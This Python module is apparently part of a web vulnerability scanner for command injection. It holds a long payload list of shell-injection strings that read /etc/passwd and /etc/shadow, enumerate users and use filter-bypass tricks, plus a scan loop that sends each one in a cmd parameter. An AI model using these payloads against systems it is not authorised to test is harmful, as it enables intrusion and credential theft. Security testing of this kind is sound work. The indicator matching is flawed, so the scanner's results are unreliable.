from .base import BaseScanner, Vulnerability
from ..core.target import Target
from typing import List
import logging

logger = logging.getLogger(__name__)

class CommandInjectionScanner(BaseScanner):
    """Scanner for Command Injection vulnerabilities"""
    
    PAYLOADS = [
        # Unix/Linux - Semicolon separator
        "; ls",
        "; ls -la",
        "; cat /etc/passwd",
        "; cat /etc/shadow",
        "; cat /etc/hosts",
        "; id",
        "; uname -a",
        "; whoami",
        "; pwd",
        
        # Unix/Linux - Pipe operator
        "| ls",
        "| whoami",
        "| id",
        "| cat /etc/passwd",
        "| uname -a",
        
        # Unix/Linux - AND operator
        "&& ls",
        "&& whoami",
        "&& id",
        "&& cat /etc/passwd",
        "&& uname -a",
        
        # Unix/Linux - OR operator
        "|| ls",
        "|| whoami",
        "|| id",
        
        # Unix/Linux - Ampersand (background)
        "& ls",
        "& whoami",
        "& ping -c 1 127.0.0.1",
        
        # Command substitution - Backticks
        "`id`",
        "`whoami`",
        "`cat /etc/passwd`",
        "`uname -a`",
        
        # Command substitution - $()
        "$(id)",
        "$(whoami)",
        "$(cat /etc/passwd)",
        "$(uname -a)",
        "$(ls -la)",
        
        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "& sleep 5 &",
        "; sleep 10",
        "$(sleep 5)",
        "`sleep 5`",
        
        # Windows-specific
        "& dir",
        "| dir",
        "&& dir",
        "& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        "&& type C:\\Windows\\win.ini",
        "& whoami",
        "| whoami",
        "&& whoami",
        "& net user",
        
        # Newline injection
        "%0a whoami",
        "%0a id",
        "%0a ls",
        "\n whoami",
        "\n id",
        
        # Filter bypass - Encoding
        ";wh\\oami",
        ";/bin/cat${IFS}/etc/passwd",
        ";${IFS}cat${IFS}/etc/passwd",
        ";cat</etc/passwd",
        
        # Filter bypass - Quotes
        ";'w'h'o'a'm'i",
        ";\"w\"h\"o\"a\"m\"i",
        
        # Environment variables
        "; echo $PATH",
        "; echo $HOME",
        "| printenv",
        
        # Chained commands
        "; ls -la && cat /etc/passwd",
        "| whoami && id",
    ]
    
    INDICATORS = [
        "root:",
        "uid=",
        "gid=",
        "groups=",
        "bin",
        "sbin",
        "etc",
        "tmp",
        "localhost",
        "127.0.0.1",
        "total ",  # ls -la output
        "drwx",  # directory permissions
        "-rw-",  # file permissions
        "Windows",
        "Program Files",
        "WINDOWS",
        "c:\\",
        "C:\\",
        "volume in drive",
        "directory of",
        "Linux",
        "GNU",
        "Darwin",  # macOS
    ]
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """Scan target for Command Injection vulnerabilities"""
        vulnerabilities = []
        logger.info(f"Starting Command Injection scan on {target.url}")
        
        for payload in self.PAYLOADS:
            # Notify callback
            if callback:
                callback(payload)
                
            try:
                # Test in URL parameters
                if '?' in target.url:
                    test_url = f"{target.url}&cmd={payload}"
                else:
                    test_url = f"{target.url}?cmd={payload}"
                
                response = self.session.get(test_url, timeout=3)
                
                # Check for command injection indicators
                for indicator in self.INDICATORS:
                    if indicator in response.text.lower():
                        vuln = Vulnerability(
                            name="Command Injection",
                            description=f"Potential command injection vulnerability detected. The application may be executing system commands based on user input.",
                            severity="CRITICAL",
                            evidence=f"Payload: {payload}, Indicator found: {indicator}, Response preview: {response.text[:200]}"
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"Command Injection found at {test_url}")
                        break
                        
            except Exception as e:
                logger.debug(f"Error testing payload {payload}: {str(e)}")
                continue
        
        return vulnerabilities
